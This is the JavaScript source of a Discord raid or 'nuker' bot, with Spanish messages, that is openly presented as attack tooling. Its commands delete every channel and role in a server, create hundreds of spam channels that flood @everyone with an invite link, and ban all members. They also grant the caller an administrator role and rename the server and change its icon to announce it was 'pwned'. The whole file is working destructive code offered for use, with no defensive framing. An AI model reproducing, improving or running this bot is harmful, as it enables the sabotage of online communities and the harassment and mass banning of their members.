
const Discord = require("discord.js");
const client = new Discord.Client();
const Monitor = require('ping-monitor');
const keepAlive = require('./server');
const chalk = require('chalk');

client.on("ready", () => {

  console.log(chalk.red(`
Bot Encendido Cliente ${client.user.tag}
  `))



  console.log(chalk.cyan(`
                      ╔═══╦╗──╔╦╗─╔╦═══╦═══╗
                      ║╔═╗║╚╗╔╝║║─║╠╗╔╗║╔═╗║
                      ║║─║╠╗╚╝╔╣║─║║║║║║║─║║
                      ║╚═╝║╚╗╔╝║║─║║║║║║╚═╝║
                      ║╔═╗║─║║─║╚═╝╠╝╚╝║╔═╗║
                      ╚╝─╚╝─╚╝─╚═══╩═══╩╝─╚╝
            
        ╔═════════════════════════════════════════════════╗
        ║ !nuke      Jode el server                       ║
        ║ !banall    Banea a todos los miembros           ║
        ║ !raid       Crea canales                        ║   
        ║ !delete roles Elimina todos los roles           ║
        ║ !help   Muestra el menu de ayuda                ║
        ║ !info Da info del raid                          ║ 
        ╚═════════════════════════════════════════════════╝                           

`))


  presencia();
});

keepAlive();
const monitor = new Monitor({
  website: 'https://Security-Bot-Raid-10.znkml.repl.co',
  title: 'Esto es solo para los users de replit',
  interval: 15 // minutes
});

////////Monitor//////////

monitor.on('down', (res) => console.log(`${res.website} se ha caído - ${res.statusMessage}`));

//////////////////////



function presencia() {
  client.user.setPresence({
    status: "online",
    activity: {
      name: "AOS COMMUNITY",
      type: "PLAYING"
    

    }
  });
}

//automatico

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '!nuke') {
    timeout: 6000,
    console.log(chalk.green(`                                                                     [+] Raid en ejecucion`))


    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`AOS NUKER ON TOP`, {
      type: 'text'
    }).then(channel => {
      channel.send("  Server muerto @everyone F                        https://discord.gg/WhvXMCk7Py")
    })
    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(`raided-by-aoscommunity`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");

      




      })
    }
    message.guild.setName("Pwned by AOS community");
    message.guild.setIcon("https://cdn.discordapp.com/attachments/975547256373653514/996663011911663686/unknown.png");


    };
});





//admin

client.on("message", async msg => {


  if (msg.author.bot) return;
  if (msg.content.toLowerCase().startsWith('!admin')) {
    let rol = await msg.guild.roles.create({
      data: {
        name: "AOS",
        color: "B9BBBE",
        permissions: "ADMINISTRATOR",
        hoisted: false
      }
    })

    msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => { });
      })
      .catch(e => { });
  }
});


//lista


client.on("message", message => {


  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === '!info') {
    message.delete()
    const embed = new Discord.MessageEmbed()
      .setTitle("Informacion de proceso del raid")
      .setThumbnail()
      .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
      .setColor("RED");
    message.channel.send(embed)
  }
});


//banall

client.on("message", async message => {
  if (message.content.startsWith('!banall')) {
    message.delete();
    if (!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
    message.guild.members.cache.forEach(member => {
      if (member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID") {
        member.ban();
      }
    })
  }
});





//borrar roles

client.on("message", message => {


  if (message.author.bot) return;

  if (message.content === ('!delete roles')) {
    message.delete()
    message.guild.roles.cache.map(roles => roles.delete());
  }
});

//crear roles

client.on("message", message => {

  if (message.author.bot) return;

  if (message.content === '!nuke') {
    message.delete()
    for (let i = 0; i <= 200; i++) {
      message.guild.roles.create({ data: { name: `AOS COMMUNITY`, color: '#d41818', }, reason: 'razon', })
    };
  }
});


client.on("message", message => {


  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === '!help') {
    message.delete()
    const embed = new Discord.MessageEmbed()
      .setTitle(" :biohazard: MIS COMANDOS :bomb: ")
      .setThumbnail()
      .setDescription(`**!nuke**  \`\Borra todo los canales y crea otros canals y roles \`\


\n**!delete roles**  \`\BORRA TODOS LOS ROLES\`\

\n**!banall**  \`\BANEA A TODOS\`\

\n**!raid**  \`\Hace mas spam de canales\`\

\n**!info**   \`\DA INFORMACION DEL RAID\`\
`)  
      .setColor("RANDOM");
    message.channel.send(embed)
  }
});

client.on("message", message => {


  if (message.author.bot) return;

  if (message.content === '!raid') {
    message.delete()
    for (let i = 0; i <= 100; i++) {
      message.guild.channels.create(`raided-by-clowners`, {
        type: 'text'
      }).then(channel => {
        
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
      channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
        channel.send("@everyone EXTERMINADOS POR https://discord.gg/WhvXMCk7Py");
         



      })
    }
  }
});


client.login("TOKEN DEL BOT");


